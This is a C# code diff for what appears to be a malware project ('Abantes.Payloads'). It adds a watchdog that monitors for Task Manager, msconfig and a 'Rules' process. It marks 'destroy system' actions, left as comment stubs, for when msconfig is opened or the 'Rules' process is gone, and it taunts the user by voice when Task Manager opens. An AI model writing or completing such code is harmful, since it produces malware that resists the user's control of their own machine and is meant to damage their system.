@@ -18,7 +18,12 @@ namespace Abantes.Payloads
 {
     class Threads
     {
-
+        public static void WathcDogThread()
+        {
+            WatchDog.Rules("Rules");
+            WatchDog.msconfig("msconfig");
+            WatchDog.TaskMGR("taskmgr");
+        }
     }
     class Anoying
     {
@@ -154,8 +159,38 @@ namespace Abantes.Payloads
             catch { }
         }
     }
-    class WatchDogThreads
+    class WatchDog
     {
+        public static void Rules(string sProcessName)
+        {
+            Process[] proc = Process.GetProcessesByName(sProcessName);
+            if (proc.Length > 0)
+            {
 
+            }
+            else
+            {
+               //destroy system
+            }
+        }
+        public static void msconfig(string sProcessName)
+        {
+            Process[] proc = Process.GetProcessesByName(sProcessName);
+            if (proc.Length > 0)
+            {
+                //destroy System
+            }
+        }
+        public static void TaskMGR(string sProcessName)
+        {
+            Process[] proc = Process.GetProcessesByName(sProcessName);
+            if (proc.Length > 0)
+            {
+                SpeechSynthesizer TTS = new SpeechSynthesizer();
+                TTS.SetOutputToDefaultAudioDevice();
+                TTS.Volume = 100;
+                TTS.Speak("There Is No Way");
+            }
+        }
     }
 }
